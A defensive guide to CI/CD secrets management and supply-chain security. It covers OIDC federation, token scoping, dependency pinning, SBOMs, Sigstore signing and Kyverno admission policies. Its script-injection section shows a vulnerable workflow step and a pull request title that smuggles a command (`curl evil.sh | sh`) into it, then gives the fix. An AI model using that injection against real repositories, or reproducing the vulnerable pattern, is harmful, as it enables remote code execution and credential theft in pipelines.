# Secrets Management and Supply-Chain Security

A pipeline is the most privileged automation most organisations run. It holds credentials to
production, executes code written by everyone with commit access, and pulls third-party code from
the internet at build time. Both halves of that sentence are attack surface: the secrets you give
it, and the code you make it run.

## The threat model, concretely

Before choosing tools, enumerate what an attacker gains from each foothold:

| Foothold | Gains |
|---|---|
| A malicious pull request from a fork | Runs code in your CI, but with a read-only token and no secrets |
| Write access to a branch | Can modify workflow files; can poison caches the default branch restores |
| A compromised third-party action | Executes with the job's token and any secret in scope |
| A leaked long-lived cloud key | Full access until someone notices, possibly months |
| A dependency substitution | Arbitrary code inside your artefact, signed by you |
| Read access to CI logs | Anything that was printed, including masked-but-mishandled values |

The design goal is to make each of those worth as little as possible: short-lived credentials,
least-privilege tokens, pinned dependencies, and logs that never contain secrets in the first
place.

## Stop storing cloud credentials

A static access key in repository secrets is a permanent credential that works from anywhere. It
cannot be scoped to a repository or a branch, it does not expire, and it is copied into every
fork, laptop and backup that ever read the settings page.

The modern replacement is workload identity federation: the CI platform issues a signed OIDC token
describing *this job in this repository on this ref*, and the cloud provider exchanges it for
short-lived credentials. Nothing secret is stored.

```yaml
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-api
          aws-region: eu-west-1
```

The security lives in the role's trust policy, which must constrain more than the repository:

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:acme/api:environment:production"
    }
  }
}
```

A trust policy that accepts `repo:acme/api:*` lets any branch — including one opened by a
contributor — assume the production role. Constrain on `environment:` or `ref:refs/heads/main`,
and remember that the subject claim is the only thing standing between a pull request and your
cloud account.

Google Cloud uses the same idea with Workload Identity Federation
(`google-github-actions/auth@v2` with `workload_identity_provider`), and Azure with federated
credentials on an app registration. Vault adds dynamic secrets: the pipeline authenticates with
its OIDC identity and receives a database credential with a lease, so there is no static password
to rotate.

## Handling secrets that must exist

Some secrets are unavoidable — a signing key, a third-party API token, a registry password. For
those:

- Store them in the platform's secret store scoped to the narrowest environment, never at
  workflow level where every job can read them.
- Prefer a secret manager the pipeline fetches from at runtime (Vault, AWS Secrets Manager, GCP
  Secret Manager) over repository secrets, so rotation does not require a settings change.
- Never pass them through `env:` at workflow scope; a job running `npm install` from a fork can
  read its own environment.
- Do not write them to files that get uploaded as artefacts, and do not put them in `GITHUB_ENV`
  if a later step might dump the environment.
- Masking is a display filter, not a guarantee: a secret that is base64-encoded, split, or printed
  in an error message will appear in logs despite masking.

## Script injection

The most common CI-specific vulnerability is interpolating untrusted context into a shell step.
This is exploitable:

```yaml
      - run: echo "Deploying ${{ github.event.pull_request.title }}"
```

A pull request titled `"; curl evil.sh | sh; echo "` executes. The fix is to pass untrusted values
through the environment, where they are data rather than code:

```yaml
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Deploying $TITLE"
```

The same applies to issue bodies, commit messages, branch names and `github.head_ref`. Any context
that a contributor controls is untrusted input.

`pull_request_target` deserves its own warning: it runs in the base repository's context *with*
secrets, and if it checks out the pull request's code, it hands those secrets to the contributor.
The safe pattern is to use it only for labelling or commenting, never with a checkout of
untrusted code.

## Least privilege on the token

`GITHUB_TOKEN` is created per job and expires with it, which is a genuine improvement over a
personal access token. Its permissions are still a decision:

```yaml
permissions: {}          # workflow default: nothing

jobs:
  test:
    permissions:
      contents: read
  publish:
    permissions:
      contents: read
      packages: write
      id-token: write
```

Start from nothing and grant per job. A test job needs `contents: read`; a release job needs
`packages: write`; a job that comments on a PR needs `pull-requests: write`. The blast radius of a
compromised action is exactly the token's permissions.

## Dependencies and third-party actions

Every dependency is code you will run with your credentials.

- **Pin actions by commit SHA.** A tag like `@v3` is mutable; the owner (or an attacker with their
  token) can move it to a commit that exfiltrates your secrets. Pinning to a SHA and letting
  Dependabot bump it is the standard mitigation.
- **Audit what an action does before adopting it.** An action is a program with network access. A
  composite action that curls a script is a supply-chain dependency, not a convenience.
- **Use lockfiles and frozen installs.** `npm ci`, `pip install --require-hashes`, `poetry install
  --sync`, `go mod verify`. Unpinned resolution means the artefact depends on what the registry
  served that day.
- **Beware dependency confusion.** A private package name that also exists on the public registry
  can be shadowed if your resolver checks public first. Scope private names, configure registry
  precedence, and verify provenance where the ecosystem supports it.
- **Watch the build's own dependencies.** Base images, GitHub Actions, and CI plugins are
  dependencies too, and they are usually the least reviewed ones.

## SBOM

A software bill of materials is a machine-readable inventory of everything in the artefact:
packages, versions, licences, and ideally their relationships. Generate it at build time, for the
artefact you actually ship.

```bash
syft ghcr.io/acme/api@sha256:4b1e… -o cyclonedx-json > sbom.cdx.json
```

The format matters less than the practice: CycloneDX and SPDX are both widely consumed. Attach the
SBOM to the image (`build-push-action` with `sbom: true` writes an attestation) and store it with
the release record. When a CVE lands, the question "are we affected?" becomes a query against
SBOMs rather than a rebuild-and-scan exercise across every service — which is the difference
between answering in minutes and answering in days.

## Signing and provenance

A signature over a digest proves *who signed* and *that the bytes have not changed*. It does not
prove how the artefact was built. Both matter.

Sigstore's keyless flow removes key management: the pipeline authenticates with its OIDC identity,
Fulcio issues a short-lived certificate bound to that identity, the signature and certificate are
recorded in Rekor's transparency log, and verification checks the identity rather than a public
key.

```bash
cosign sign --yes ghcr.io/acme/api@sha256:4b1e…
cosign verify ghcr.io/acme/api@sha256:4b1e… \
  --certificate-identity-regexp '^https://github.com/acme/api/\.github/workflows/release\.yml@refs/tags/v.*$' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

The second command is the important one. `cosign verify` without `--certificate-identity` accepts
any signature from anyone, including an attacker who signed their own image with the same name —
which is a real and frequently demonstrated confusion, not a theoretical one.

Provenance goes further: a signed attestation describing the build — source repository, commit,
builder, invocation — in the in-toto format. SLSA defines levels for how much of that chain is
tamper-evident. `actions/attest-build-provenance` generates one from a GitHub Actions job without
extra infrastructure:

```yaml
      - uses: actions/attest-build-provenance@v1
        with:
          subject-name: ghcr.io/acme/api
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true
```

## Verification at admission

Signing is worthless if nothing checks. The last link is admission control: a policy that rejects
any image without a valid signature from the expected identity.

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-api-images
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-signature
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences: ["ghcr.io/acme/*"]
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/acme/api/.github/workflows/release.yml@refs/tags/*"
                    issuer: "https://token.actions.githubusercontent.com"
```

With that in place, an unsigned or wrongly-signed image cannot run, even if someone has push access
to the registry. That closes the loop: the registry is no longer trusted by possession, only by
provenance.

## Common mistakes

- Long-lived cloud keys in repository secrets, with a trust policy that accepts any ref.
- Secrets declared at workflow level, readable by every job including dependency installs.
- Interpolating `github.event.*` values into `run:` blocks.
- `pull_request_target` plus a checkout of the PR's code.
- Third-party actions pinned to a mutable tag.
- Verifying a signature without constraining the signer identity.
- Generating an SBOM after the deploy, or never, and then treating CVE response as a rebuild.
- Assuming log masking prevents leakage of encoded or transformed secrets.

## Production notes

Rotate everything that is not short-lived, and keep a register of what cannot be rotated — those
are the credentials to remove next. Give the pipeline its own identity per environment, so a
compromise of staging credentials does not reach production. Log every assumption made at deploy
time (digest, signature identity, policy result) into the deployment record, because the audit
question after an incident is not "was it signed" but "which workflow, at which commit, signed
this, and who approved it".
